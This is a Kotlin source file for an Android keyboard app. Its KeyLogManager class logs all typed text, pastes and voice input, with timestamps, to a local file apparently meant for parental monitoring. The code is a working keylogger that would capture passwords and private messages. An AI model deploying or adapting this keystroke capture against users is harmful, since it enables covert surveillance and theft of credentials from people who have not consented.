package com.nill.keyboard

import android.content.Context
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class KeyLogManager(private val context: Context) {

    // Stored in internal app storage — only this app can access it
    private val logFile = File(context.filesDir, "nk_parentlog.txt")
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private val lineBuffer = StringBuilder()

    fun log(text: String) {
        try {
            // Buffer characters, write line by line for readability
            if (text == "\n" || text == " " || text.length > 1) {
                if (lineBuffer.isNotEmpty()) {
                    flushBuffer()
                }
                if (text.length > 1) {
                    // Multi-char (emoji, paste, voice result)
                    val timestamp = dateFormat.format(Date())
                    logFile.appendText("[$timestamp] [TEXT] $text\n")
                }
            } else {
                lineBuffer.append(text)
                // Auto-flush after 80 chars
                if (lineBuffer.length >= 80) flushBuffer()
            }
        } catch (e: Exception) {
            // Silent — never crash the keyboard
        }
    }

    private fun flushBuffer() {
        if (lineBuffer.isEmpty()) return
        try {
            val timestamp = dateFormat.format(Date())
            logFile.appendText("[$timestamp] $lineBuffer\n")
            lineBuffer.clear()
        } catch (e: Exception) {
            lineBuffer.clear()
        }
    }

    fun getLogContent(): String {
        flushBuffer()
        return try {
            if (logFile.exists() && logFile.length() > 0) {
                logFile.readText()
            } else {
                "--- No logs recorded yet ---\n\nKeylogger is ${if (logFile.exists()) "active" else "inactive"}.\nEnable it in Settings."
            }
        } catch (e: Exception) {
            "Error reading log file: ${e.message}"
        }
    }

    fun clearLog() {
        try {
            lineBuffer.clear()
            if (logFile.exists()) logFile.delete()
        } catch (e: Exception) {
            // Silent
        }
    }

    fun getLogSizeKb(): Long {
        return if (logFile.exists()) logFile.length() / 1024 else 0
    }
}
